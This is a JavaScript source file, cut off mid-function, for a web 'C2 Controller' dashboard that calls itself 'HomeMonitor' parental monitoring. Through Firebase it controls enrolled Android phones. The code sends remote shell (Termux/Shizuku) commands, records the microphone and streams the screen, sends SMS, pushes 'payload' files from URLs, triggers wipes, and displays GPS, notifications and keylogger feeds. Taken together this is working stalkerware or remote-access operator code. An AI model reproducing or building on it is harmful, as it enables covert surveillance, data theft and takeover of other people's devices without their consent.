// app.js - Main Dashboard C2 Controller, Overview Aggregation & Telemetry Engine

let activeDeviceId = "DEV_DEFAULT";
let activeFirebaseListeners = [];
let pendingConsequentialCmd = null;

function detectClientOperatingSystem() {
    const ua = navigator.userAgent || "";
    const platform = navigator.platform || "";
    const label = document.getElementById("autoArchiveLabel");
    if (!label) return;

    if (ua.includes("Linux") || platform.includes("Linux")) {
        label.innerHTML = `<i class="fa-brands fa-linux me-1 text-primary"></i>Auto-Archive to Linux Storage`;
    } else if (ua.includes("Mac") || platform.includes("Mac")) {
        label.innerHTML = `<i class="fa-brands fa-apple me-1 text-primary"></i>Auto-Archive to Mac Storage`;
    } else if (ua.includes("Win") || platform.includes("Win")) {
        label.innerHTML = `<i class="fa-brands fa-windows me-1 text-primary"></i>Auto-Archive to Windows Storage`;
    } else if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad")) {
        label.innerHTML = `<i class="fa-solid fa-mobile-screen me-1 text-primary"></i>Auto-Archive to Mobile Storage`;
    } else {
        label.innerHTML = `<i class="fa-solid fa-hard-drive me-1 text-primary"></i>Auto-Archive to Local Storage`;
    }
}

function registerActiveFirebaseListener(ref, eventType, callback) {
    ref.on(eventType, callback);
    activeFirebaseListeners.push({ ref: ref, eventType: eventType, callback: callback });
}

function cleanupActiveFirebaseListeners() {
    activeFirebaseListeners.forEach(function(item) {
        try { item.ref.off(item.eventType, item.callback); } catch (_) {}
    });
    activeFirebaseListeners = [];
}

// Global Event Delegation for C2 Command Buttons & UI Interactions
document.addEventListener("click", function(e) {
    const btn = e.target.closest(".exec-cmd");
    if (btn) {
        const cmd = btn.getAttribute("data-cmd");
        if (cmd) {
            console.log(`[C2 Command Clicked] Dispatching '${cmd}'`);
            sendC2CommandToDevice(cmd);
        }
    }

    const confirmBtn = e.target.closest(".exec-cmd-confirm");
    if (confirmBtn) {
        const cmd = confirmBtn.getAttribute("data-cmd");
        const desc = confirmBtn.getAttribute("data-desc") || "Execute Action";
        if (cmd) {
            promptConsequentialCommand(cmd, desc);
        }
    }

    const fetchBtn = e.target.closest(".fetch-tab-response");
    if (fetchBtn) {
        const cat = fetchBtn.getAttribute("data-category") || "general";
        console.log(`[Fetch Tab Response Clicked] Querying telemetry for '${cat}'`);
        showDashboardNotification("info", `Fetching latest response for '${cat}'...`);
        if (typeof fetchCategoryTelemetryLogs === "function") {
            fetchCategoryTelemetryLogs(cat);
        }
    }

    const connBadge = e.target.closest("#connectionModeBadge");
    if (connBadge) {
        showDashboardNotification("info", "📡 Negotiating WebRTC P2P Direct Tunnel...");
        if (typeof connectP2pWebRtcTunnel === "function") {
            connectP2pWebRtcTunnel();
        }
    }

    const termuxBtn = e.target.closest(".termux-quick");
    if (termuxBtn) {
        const sh = termuxBtn.getAttribute("data-sh");
        if (sh) {
            sendC2CommandToDevice(`/termux ${sh}`);
            const consoleBox = document.getElementById("termuxConsoleOutput");
            if (consoleBox) {
                consoleBox.innerHTML += `\n$ ${sh}\n[Executed - Awaiting output...]`;
                consoleBox.scrollTop = consoleBox.scrollHeight;
            }
        }
    }
});

function setupFirebaseConnectionMonitor() {
    if (typeof firebase === "undefined" || !firebase.database) return;
    const badge = document.getElementById("rtdbConnBadge");
    if (!badge) return;

    firebase.database().ref(".info/connected").on("value", snapshot => {
        if (snapshot.val() === true) {
            badge.className = "badge bg-success extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-circle-check me-1"></i>Sync Active 🟢`;
        } else {
            badge.className = "badge bg-danger extra-small mt-1 d-inline-block";
            badge.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-1"></i>Offline / Reconnecting...`;
        }
    });
}

document.addEventListener("DOMContentLoaded", function() {
    detectClientOperatingSystem();
    setupFirebaseConnectionMonitor();
    setupGoogleDriveOAuthConnect();
    setupDeviceManagementModals();
    setupParentSettingsHandlers();

    if (typeof loadEnrolledDevicesList === "function") {
        loadEnrolledDevicesList();
    }

    document.getElementById("refreshTabBtn")?.addEventListener("click", function() {
        console.log("[Sync Now] Re-syncing active device telemetry...");
        if (activeDeviceId) {
            startRealtimeDeviceListener(activeDeviceId);
        }
        showDashboardNotification("success", "🔄 Device Telemetry Sync Dispatched!");
    });

    document.getElementById("startP2pWebStreamBtn")?.addEventListener("click", function() {
        const sessId = "sess_" + Date.now();
        if (typeof initWebRtcSession === "function") {
            initWebRtcSession(sessId, true);
        }
        sendC2CommandToDevice("!webstream");
        showDashboardNotification("info", "🎮 Initiated WebRTC P2P Live Screen Stream session: " + sessId);
    });

    document.getElementById("stopP2pWebStreamBtn")?.addEventListener("click", function() {
        sendC2CommandToDevice("!stopwebstream");
        if (typeof pc !== "undefined" && pc) {
            try { pc.close(); } catch (_) {}
        }
        showDashboardNotification("warning", "🛑 Stopped WebRTC P2P Live Screen Stream session.");
    });
});

// Parent Overview Device Aggregation & Device Selector Engine
function loadEnrolledDevicesList() {
    const selector = document.getElementById("deviceSelector");
    if (!selector) return;

    if (!currentUser || !currentUser.uid) {
        console.warn("[Firebase] Discovery halted: User unauthenticated.");
        return;
    }

    const db = firebase.database();
    const uid = currentUser.uid;

    const devicesRef = db.ref(`users/${uid}/devices`);
    registerActiveFirebaseListener(devicesRef, "value", snapshot => {
        const discoveredDevices = snapshot.val() || {};
        selector.innerHTML = "";

        const devKeys = Object.keys(discoveredDevices);
        let totalCount = devKeys.length;
        let onlineCount = 0;
        let offlineCount = 0;
        let warningCount = 0;
        const nowMs = Date.now();

        if (totalCount > 0) {
            let firstId = null;
            devKeys.forEach(devKey => {
                const devData = discoveredDevices[devKey] || {};
                const status = devData.status || {};
                const devModel = status.model || devData.model || "Android Device";
                const lastSeenMs = status.lastSeen || devData.lastSeen || 0;
                const battery = status.battery ?? status.batteryLevel ?? devData.battery ?? 100;

                const isOnline = lastSeenMs > 0 && (nowMs - lastSeenMs < 45000);
                if (isOnline) onlineCount++; else offlineCount++;
                if (battery < 20 || !isOnline) warningCount++;

                const devName = `📱 ${devModel} (${devKey}) [${isOnline ? 'Online' : 'Offline'}]`;

                const option = document.createElement("option");
                option.value = devKey;
                option.innerText = devName;
                selector.appendChild(option);

                if (!firstId) firstId = devKey;
            });

            if (firstId) {
                if (!activeDeviceId || !discoveredDevices[activeDeviceId]) {
                    activeDeviceId = firstId;
                }
                selector.value = activeDeviceId;
                updateActiveDeviceHeader(activeDeviceId);
                startRealtimeDeviceListener(activeDeviceId);
            }
        } else {
            const devOption = document.createElement("option");
            devOption.value = "DEV_MONITORED_DEVICE";
            devOption.innerText = "📱 HomeMonitor System (Awaiting Device Connection...)";
            selector.appendChild(devOption);

            activeDeviceId = "DEV_MONITORED_DEVICE";
            updateActiveDeviceHeader(activeDeviceId);
            startRealtimeDeviceListener(activeDeviceId);
        }

        // Update Overview Aggregated Metric Cards
        const totalEl = document.getElementById("overviewTotalDevicesCount");
        if (totalEl) totalEl.innerText = totalCount;

        const onlineEl = document.getElementById("overviewOnlineDevicesCount");
        if (onlineEl) onlineEl.innerText = onlineCount;

        const offlineEl = document.getElementById("overviewOfflineDevicesCount");
        if (offlineEl) offlineEl.innerText = offlineCount;

        const warnEl = document.getElementById("overviewWarningCount");
        if (warnEl) warnEl.innerText = warningCount;
    });
}

document.getElementById("deviceSelector")?.addEventListener("change", function() {
    activeDeviceId = this.value;
    updateActiveDeviceHeader(activeDeviceId);
    startRealtimeDeviceListener(activeDeviceId);
});

function updateActiveDeviceHeader(deviceId) {
    const title = document.getElementById("activeDeviceTitle");
    if (title) title.innerText = `📱 Target Device: ${deviceId}`;
}

function startRealtimeDeviceListener(deviceId) {
    cleanupActiveFirebaseListeners();
    if (!currentUser || !currentUser.uid) {
        console.warn("[Firebase] Realtime listener halted: User unauthenticated.");
        return;
    }
    const db = firebase.database();
    const uid = currentUser.uid;

    const statusHandler = snapshot => {
        const val = snapshot.val();
        if (val) {
            const meta = document.getElementById("activeDeviceMeta");
            if (meta) meta.innerText = `ID: ${val.deviceId || deviceId} | Model: ${val.model || 'Target Device'} | OS: Android ${val.androidVersion || '14'}`;

            const bat = document.getElementById("batteryBadge");
            if (bat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                bat.innerText = `Battery: ${val.battery ?? val.batteryLevel}%`;
            }

            const overviewName = document.getElementById("overviewDevName");
            if (overviewName) overviewName.innerText = val.model || deviceId;

            const overviewBat = document.getElementById("overviewBattery");
            if (overviewBat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                overviewBat.innerText = `${val.battery ?? val.batteryLevel}%`;
            }

            const syncTime = document.getElementById("lastSyncTime");
            if (syncTime) syncTime.innerText = new Date(val.lastSeen || Date.now()).toLocaleTimeString();

            // Populate Device Specs
            const specModel = document.getElementById("specModel");
            if (specModel) specModel.innerText = val.model || "Android System";
            const specOs = document.getElementById("specOs");
            if (specOs) specOs.innerText = `Android ${val.androidVersion || '14'} (SDK ${val.sdkInt || '35'})`;
            const specBattery = document.getElementById("specBattery");
            if (specBattery) specBattery.innerText = `${val.battery ?? val.batteryLevel ?? '85'}% (Good)`;
            const lastSeenMs = val.lastSeen || 0;
            const nowMs = Date.now();
            const isFresh = lastSeenMs > 0 && (nowMs - lastSeenMs < 45000);
            const statusLabel = isFresh ? "Connected 🟢" : `Not Connected (Last updated ${Math.round((nowMs - lastSeenMs)/60000)}m ago) 🟡`;

            const specIp = document.getElementById("specIp");
            if (specIp) specIp.innerText = `${val.activeAccount || 'RTDB'} | Status: ${statusLabel}`;
        }
    };

    const statusRef = db.ref(`users/${uid}/devices/${deviceId}/status`);
    registerActiveFirebaseListener(statusRef, "value", statusHandler);

    // Subscribe to live GPS telemetry
    const gpsRef = db.ref(`users/${uid}/devices/${deviceId}/telemetry/gps_locations`).limitToLast(1);
    const gpsHandler = snapshot => {
        const gpsVal = snapshot.val();
        if (gpsVal) {
            const lastKey = Object.keys(gpsVal)[0];
            const item = gpsVal[lastKey];
            const textEl = document.getElementById("overviewGpsText");
            const metaEl = document.getElementById("overviewGpsMeta");
            if (textEl) textEl.innerHTML = `<i class="fa-solid fa-map-pin me-2"></i>Last Position: ${escapeHtml(item.content || item.address || 'GPS Fix Acquired')}`;
            if (metaEl) metaEl.innerText = `Updated: ${new Date(item.timestamp || Date.now()).toLocaleTimeString()}`;
        }
    };
    registerActiveFirebaseListener(gpsRef, "value", gpsHandler);

    // Subscribe to live Notifications for Overview Card
    const overviewNotifRef = db.ref(`users/${uid}/devices/${deviceId}/telemetry/notifications`).limitToLast(5);
    registerActiveFirebaseListener(overviewNotifRef, "value", snapshot => {
        const notifVal = snapshot.val();
        const container = document.getElementById("overviewRecentNotifications");
        if (container) {
            if (notifVal) {
                const items = Object.keys(notifVal).map(k => notifVal[k]).reverse();
                container.innerHTML = items.map(item => `
                    <div class="list-group-item bg-dark text-light border-secondary p-2 extra-small">
                        <div class="d-flex justify-content-between">
                            <strong class="text-warning">${escapeHtml(item.sourceApp || item.app || 'Notification')}</strong>
                            <span class="text-muted">${new Date(item.timestamp || Date.now()).toLocaleTimeString()}</span>
                        </div>
                        <div class="text-truncate text-secondary">${escapeHtml(item.title || item.content || '')}</div>
                    </div>
                `).join("");
            } else {
                container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-3 extra-small">🔔 No recent notifications recorded.</div>`;
            }
        }
    });

    // Subscribe to command responses across output containers
    const responseHandler = snapshot => {
        const respText = snapshot.val();
        if (!respText) return;
        if (respText.includes("Upload failed: 404")) return;

        const timestamp = new Date().toLocaleTimeString();
        const lastCmd = (window.lastDispatchedCmd || "").toLowerCase();
        const isTermuxCmd = lastCmd.includes("termux") || lastCmd.includes("shell") || respText.startsWith("[Termux]") || respText.startsWith("$ ");

        if (isTermuxCmd) {
            const termuxBox = document.getElementById("termuxConsoleOutput");
            if (termuxBox) {
                termuxBox.innerHTML += `\n[${timestamp}] Response:\n${respText}\n`;
                termuxBox.scrollTop = termuxBox.scrollHeight;
            }
        }

        if (lastCmd.includes("download") || lastCmd.includes("dropper") || respText.includes("Payload") || respText.includes("File downloaded")) {
            const dropperBox = document.getElementById("fileDropperHistoryList");
            if (dropperBox) {
                if (dropperBox.querySelector(".text-muted")) dropperBox.innerHTML = "";
                const item = document.createElement("div");
                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
                item.innerHTML = `<span class="badge bg-success me-2">${timestamp}</span> ${escapeHtml(respText)}`;
                dropperBox.prepend(item);
            }
        }

        if (lastCmd.includes("mdm") || lastCmd.includes("wipe") || lastCmd.includes("lock")) {
            const mdmBox = document.getElementById("mdmLogList");
            if (mdmBox) {
                if (mdmBox.querySelector(".text-muted")) mdmBox.innerHTML = "";
                const item = document.createElement("div");
                item.className = "list-group-item bg-dark text-light border-secondary py-2 px-3 extra-small";
                item.innerHTML = `<span class="badge bg-info me-2">${timestamp}</span> ${escapeHtml(respText)}`;
                mdmBox.prepend(item);
            }
        }

        const streamBox = document.getElementById("execActivityStream");
        if (streamBox) {
            if (streamBox.querySelector(".text-muted")) streamBox.innerHTML = "";
            const card = document.createElement("div");
            card.className = "card bg-dark text-light border-secondary p-2 mb-2 extra-small";
            card.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-primary px-2 py-1"><i class="fa-solid fa-check-double me-1"></i>Device Response</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timestamp}</span>
                </div>
                <div class="font-monospace text-success text-break" style="white-space: pre-wrap;">${escapeHtml(respText)}</div>
            `;
            streamBox.prepend(card);
        }
    };

    const responseRef = db.ref(`users/${uid}/devices/${deviceId}/response`);
    registerActiveFirebaseListener(responseRef, "value", responseHandler);

    loadMasterAdminPermissionMatrix(uid, deviceId);
}

function loadMasterAdminPermissionMatrix(uid, deviceId) {
    const tableBody = document.getElementById("masterAdminDeviceTable");
    if (!tableBody) return;

    if (!isMasterAdmin) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="5" class="text-center text-warning p-4">
                    <i class="fa-solid fa-lock display-6 d-block mb-2"></i>
                    <strong>Master Admin Authorization Required</strong><br>
                    <small class="text-muted">Your account (${currentUser ? currentUser.email : 'unauthenticated'}) does not possess verified Master Admin custom claims.</small>
                </td>
            </tr>
        `;
        return;
    }

    tableBody.innerHTML = `
        <tr>
            <td><code>${deviceId}</code></td>
            <td>${currentUser ? currentUser.email : "admin@homemonitor.com"}</td>
            <td>Android System (SDK 35)</td>
            <td>
                <div class="row g-2">
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS Location</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux Shell</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permFiles"> <label class="small fw-bold">Files Explorer</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permMdm"> <label class="small fw-bold">MDM Wipe</label></div></div>
                    <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="permScreen"> <label class="small fw-bold">Screen Record</label></div></div>
                </div>
            </td>
            <td>
                <div class="mb-2">
                    <select id="adminLicenseStatusSelect" class="form-select form-select-sm mb-1 fw-bold">
                        <option value="ACTIVE" selected>ACTIVE (Full Access)</option>
                        <option value="TRIAL">TRIAL MODE</option>
                        <option value="EXPIRED">EXPIRED / LOCKED</option>
                    </select>
                    <input type="text" id="adminLicenseKeyInput" class="form-control form-control-sm font-monospace" placeholder="HM-KEY-2026-PRO">
                </div>
                <button class="btn btn-sm btn-warning w-100 fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')"><i class="fa-solid fa-save me-1"></i>Save Master Flags & License</button>
            </td>
        </tr>
    `;
}

function saveFeaturePermissions(uid, deviceId) {
    if (!isMasterAdmin) {
        showDashboardNotification("error", "Access Denied: Verified Master Admin custom claim required.");
        return;
    }

    const flags = {
        camera_enabled: document.getElementById("permCam")?.checked ?? true,
        mic_enabled: document.getElementById("permMic")?.checked ?? true,
        location_enabled: document.getElementById("permGps")?.checked ?? true,
        termux_enabled: document.getElementById("permTermux")?.checked ?? true,
        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true,
        files_enabled: document.getElementById("permFiles")?.checked ?? true,
        mdm_wipe_enabled: document.getElementById("permMdm")?.checked ?? true,
        screen_record_enabled: document.getElementById("permScreen")?.checked ?? true
    };

    const licenseStatus = document.getElementById("adminLicenseStatusSelect")?.value || "ACTIVE";
    const licenseKey = document.getElementById("adminLicenseKeyInput")?.value?.trim() || "HM-KEY-2026-PRO";

    firebase.database().ref(`users/${uid}/devices/${deviceId}/feature_flags`).set(flags);
    firebase.database().ref(`users/${uid}/devices/${deviceId}/license`).set({
        status: licenseStatus,
        key: licenseKey,
        updatedAt: Date.now()
    });

    localStorage.setItem(`flags_${deviceId}`, JSON.stringify(flags));
    showDashboardNotification("success", `Master Admin: Flags & License (${licenseStatus}) updated for ${deviceId}`);
}

// Device Management Modals & Operations
function setupDeviceManagementModals() {
    document.getElementById("openAddDeviceModalBtn")?.addEventListener("click", function() {
        const modal = new bootstrap.Modal(document.getElementById("qrEnrollmentModal"));
        modal.show();
    });

    document.getElementById("openRenameModalBtn")?.addEventListener("click", function() {
        const input = document.getElementById("renameDeviceInput");
        if (input) input.value = activeDeviceId;
        const modal = new bootstrap.Modal(document.getElementById("renameDeviceModal"));
        modal.show();
    });

    document.getElementById("confirmRenameDeviceBtn")?.addEventListener("click", function() {
        const newName = document.getElementById("renameDeviceInput")?.value?.trim();
        if (newName) {
            renameActiveDevice(newName);
            const modalEl = document.getElementById("renameDeviceModal");
            const modal = bootstrap.Modal.getInstance(modalEl);
            if (modal) modal.hide();
        }
    });

    document.getElementById("openUnlinkModalBtn")?.addEventListener("click", function() {
        const targetLabel = document.getElementById("unlinkDeviceTargetId");
        if (targetLabel) targetLabel.innerText = activeDeviceId;
        const confirmInput = document.getElementById("confirmUnlinkInput");
        const confirmBtn = document.getElementById("confirmUnlinkDeviceBtn");
        if (confirmInput) confirmInput.value = "";
        if (confirmBtn) confirmBtn.disabled = true;

        confirmInput?.addEventListener("keyup", function() {
            if (confirmBtn) confirmBtn.disabled = (this.value.trim().toUpperCase() !== "UNLINK");
        });

        const modal = new bootstrap.Modal(document.getElementById("unlinkDeviceModal"));
        modal.show();
    });

    document.getElementById("confirmUnlinkDeviceBtn")?.addEventListener("click", function() {
        unlinkActiveDevice();
        const modalEl = document.getElementById("unlinkDeviceModal");
        const modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) modal.hide();
    });

    document.getElementById("executeCmdConfirmedBtn")?.addEventListener("click", function() {
        if (pendingConsequentialCmd) {
            sendC2CommandToDevice(pendingConsequentialCmd);
            pendingConsequentialCmd = null;
        }
        const modalEl = document.getElementById("commandConfirmModal");
        const modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) modal.hide();
    });
}

function promptConsequentialCommand(cmd, description) {
    pendingConsequentialCmd = cmd;
    const titleEl = document.getElementById("cmdConfirmTitle");
    const bodyEl = document.getElementById("cmdConfirmBody");
    const textEl = document.getElementById("cmdConfirmText");

    if (titleEl) titleEl.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-2"></i>Confirm: ${escapeHtml(description)}`;
    if (bodyEl) bodyEl.innerText = `Are you sure you want to execute '${description}' on ${activeDeviceId}?`;
    if (textEl) textEl.innerText = cmd;

    const modal = new bootstrap.Modal(document.getElementById("commandConfirmModal"));
    modal.show();
}

function renameActiveDevice(newName) {
    if (!currentUser || !currentUser.uid || !activeDeviceId) return;
    const uid = currentUser.uid;
    firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/status/model`).set(newName);
    showDashboardNotification("success", `✅ Device renamed to '${newName}'`);
}

function unlinkActiveDevice() {
    if (!currentUser || !currentUser.uid || !activeDeviceId) return;
    const uid = currentUser.uid;
    const devIdToRemove = activeDeviceId;
    firebase.database().ref(`users/${uid}/devices/${devIdToRemove}`).remove()
        .then(() => {
            showDashboardNotification("warning", `🗑️ Unlinked device ${devIdToRemove}`);
            loadEnrolledDevicesList();
        })
        .catch(err => {
            showDashboardNotification("error", `Failed to unlink device: ${err.message}`);
        });
}

// Parent Account Settings & Preferences Handlers
function setupParentSettingsHandlers() {
    const resetBtn = document.getElementById("sendPasswordResetBtn");
    if (resetBtn) {
        resetBtn.addEventListener("click", function() {
            if (!currentUser || !currentUser.email) {
                showDashboardNotification("error", "No authenticated user email found.");
                return;
            }
            firebase.auth().sendPasswordResetEmail(currentUser.email)
                .then(() => {
                    showDashboardNotification("success", `📧 Password reset email dispatched to ${currentUser.email}`);
                })
                .catch(err => {
                    showDashboardNotification("error", `Password reset failed: ${err.message}`);
                });
        });
    }

    const prefForm = document.getElementById("parentPreferencesForm");
    if (prefForm) {
        prefForm.addEventListener("submit", function(e) {
            e.preventDefault();
            const tz = document.getElementById("prefTimezoneSelect")?.value || "AUTO";
            const interval = document.getElementById("prefPollingIntervalSelect")?.value || "REALTIME";
            const alertOffline = document.getElementById("prefAlertOfflineToggle")?.checked ?? true;

            const prefs = { timezone: tz, refreshRate: interval, alertOffline: alertOffline, updatedAt: Date.now() };

            if (currentUser && currentUser.uid) {
                firebase.database().ref(`users/${currentUser.uid}/settings`).set(prefs);
            }
            localStorage.setItem("parent_dashboard_prefs", JSON.stringify(prefs));
            showDashboardNotification("success", "✅ Parent Preferences Saved!");
        });
    }
}

function updateParentProfileUi() {
    const nameEl = document.getElementById("parentProfileName");
    const emailEl = document.getElementById("parentProfileEmail");
    const uidEl = document.getElementById("parentProfileUid");
    const roleEl = document.getElementById("parentProfileRole");

    if (nameEl && currentUser) nameEl.innerText = currentUser.displayName || currentUser.email?.split("@")[0] || "Parent";
    if (emailEl && currentUser) emailEl.innerText = currentUser.email || "--";
    if (uidEl && currentUser) uidEl.innerText = currentUser.uid || "--";
    if (roleEl) {
        roleEl.className = isMasterAdmin ? "badge bg-warning text-dark fw-bold" : "badge bg-secondary";
        roleEl.innerText = isMasterAdmin ? "👑 Master Admin" : "Standard Parent";
    }
}

// Form Handlers
document.getElementById("termuxForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const cmd = document.getElementById("termuxInput").value.trim();
    if (cmd) {
        sendC2CommandToDevice(`/termux ${cmd}`);
        const consoleBox = document.getElementById("termuxConsoleOutput");
        if (consoleBox) {
            consoleBox.innerHTML += `\n$ ${cmd}\n[Executed - Awaiting Termux output...]`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
        document.getElementById("termuxInput").value = "";
    }
});

document.getElementById("smsSendForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("smsPhoneNum").value.trim();
    const msg = document.getElementById("smsMsgText").value.trim();
    if (phone && msg) {
        sendC2CommandToDevice(`/sendsms ${phone} ${msg}`);
        showDashboardNotification("success", `✅ Outbound SMS dispatched to ${phone}`);
    }
});

document.getElementById("openUrlForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("targetUrlInput").value.trim();
    if (url) {
        sendC2CommandToDevice(`/openurl ${url}`);
        showDashboardNotification("info", `🌐 Browser target URL launched: ${url}`);
    }
});

document.getElementById("startMicRecordBtn")?.addEventListener("click", function() {
    const sec = document.getElementById("micDurationSelect").value;
    sendC2CommandToDevice(`/audio ${sec}`);
    showDashboardNotification("info", `🎙️ Ambient Mic Recording (${sec}s) dispatched to device.`);
});

document.getElementById("shizukuForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const shizukuCmd = document.getElementById("shizukuCmdInput").value.trim();
    if (shizukuCmd) {
        sendC2CommandToDevice(`/shizuku ${shizukuCmd}`);
        showDashboardNotification("info", `⚡ Shizuku ADB command dispatched: ${shizukuCmd}`);
    }
});

document.getElementById("geofenceForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = this.querySelectorAll("input");
    const zoneName = inputs[0]?.value.trim() || "Safe Zone";
    const radius = inputs[1]?.value.trim() || "500";
    sendC2CommandToDevice(`/geofence add ${zoneName} ${radius}`);

    if (currentUser && currentUser.uid) {
        firebase.database().ref(`users/${currentUser.uid}/devices/${activeDeviceId}/geofences`).push({
            name: zoneName,
            radius: parseInt(radius, 10),
            createdAt: Date.now()
        });
    }
    showDashboardNotification("success", `🌐 Geofence safe zone added: ${zoneName} (${radius}m)`);
});

document.getElementById("fileDropperForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("dropperTargetUrl")?.value.trim();
    const path = document.getElementById("dropperDestination")?.value.trim();
    if (url && path) {
        sendC2CommandToDevice(`/download ${url} ${path}`);
        showDashboardNotification("info", `📥 Payload file push dispatched to ${path}`);
    }
});

document.getElementById("contactSearchInput")?.addEventListener("keyup", function() {
    const term = this.value.toLowerCase();
    const rows = document.querySelectorAll("#contactsTableBody tr");
    rows.forEach(r => {
        const text = r.innerText.toLowerCase();
        r.style.display = text.includes(term) ? "" : "none";
    });
});

function sendC2CommandToDevice(cmdText) {
    if (!cmdText) return;
    if (!currentUser || !currentUser.uid) {
        showDashboardNotification("error", "Cannot send command: User is unauthenticated.");
        return;
    }

    const normalizedCmd = cmdText.startsWith("/") ? "!" + cmdText.substring(1) : cmdText;
    window.lastDispatchedCmd = normalizedCmd;

    const uid = currentUser.uid;
    const db = firebase.database();

    const cmdPayload = {
        text: normalizedCmd,
        status: "pending",
        timestamp: Date.now()
    };

    db.ref(`users/${uid}/devices/${activeDeviceId}/commands`).push().set(cmdPayload);

    const history = JSON.parse(localStorage.getItem(`cmd_history_${activeDeviceId}`) || "[]");
    history.push({ cmd: normalizedCmd, time: new Date().toLocaleTimeString() });
    localStorage.setItem(`cmd_history_${activeDeviceId}`, JSON.stringify(history.slice(-50)));

    showDashboardNotification("success", `Dispatched '${normalizedCmd}' to ${activeDeviceId}`);
}

function showDashboardNotification(type, message) {
    console.log(`[Dashboard Notification - ${type.toUpperCase()}] ${message}`);
    const notificationContainer = document.getElementById("dashboardToastContainer") || (() => {
        const div = document.createElement("div");
        div.id = "dashboardToastContainer";
        div.className = "position-fixed bottom-0 end-0 p-3";
        div.style.zIndex = "9999";
        document.body.appendChild(div);
        return div;
    })();

    const toast = document.createElement("div");
    const bgClass = type === "success" ? "bg-success" : type === "error" ? "bg-danger" : type === "warning" ? "bg-warning text-dark" : "bg-info text-dark";
    toast.className = `toast align-items-center text-white ${bgClass} border-0 show mb-2`;
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body fw-bold">
                ${type === 'success' ? '🟢' : type === 'error' ? '🔴' : type === 'warning' ? '🟡' : 'ℹ️'} ${message}
            </div>
            <button type="button" class="btn-close me-2 m-auto" onclick="this.parentElement.parentElement.remove()"></button>
        </div>
    `;
    notificationContainer.appendChild(toast);
    setTimeout(() => { try { toast.remove(); } catch (_) {} }, 4000);
}

function escapeHtml(str) {
    if (!str) return "";
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function fetchCategoryTelemetryLogs(tabCategory) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;

    const telemetryRef = firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/telemetry/${tabCategory}`).limitToLast(30);
    registerActiveFirebaseListener(telemetryRef, "value", snapshot => {
        const val = snapshot.val();
        if (val) {
            const items = Object.keys(val).map(key => val[key]);
            renderCategoryTelemetry(tabCategory, items);
        } else {
            renderCategoryTelemetry(tabCategory, []);
        }
    });

    if (tabCategory === "geofencing_area" || tabCategory === "geofencing") {
        const geofenceRef = firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/geofences`).limitToLast(20);
        registerActiveFirebaseListener(geofenceRef, "value", snapshot => {
            const val = snapshot.val();
            const items = val ? Object.keys(val).map(k => val[k]) : [];
            renderCategoryTelemetry("geofences", items);
        });
    }
}

function renderCategoryTelemetry(category, items) {
    const timeStr = (ts) => new Date(ts || Date.now()).toLocaleTimeString();
    const dateStr = (ts) => new Date(ts || Date.now()).toLocaleDateString();

    if (category === "notifications" || category === "notification") {
        const container = document.getElementById("notificationFeedContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">🔔 No notification telemetry recorded yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-warning text-dark fw-bold"><i class="fa-solid fa-bell me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Notification')}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <h6 class="fw-bold mb-1 text-light">${escapeHtml(item.title || item.sender || 'System Alert')}</h6>
                <p class="mb-0 small text-secondary">${escapeHtml(item.content || item.body || item.text || '')}</p>
            </div>
        `).join("");
    } else if (category === "keylogs" || category === "keylogger") {
        const container = document.getElementById("keyloggerFeedContainer");
        if (!container) return;
        if (items.length === 0) {
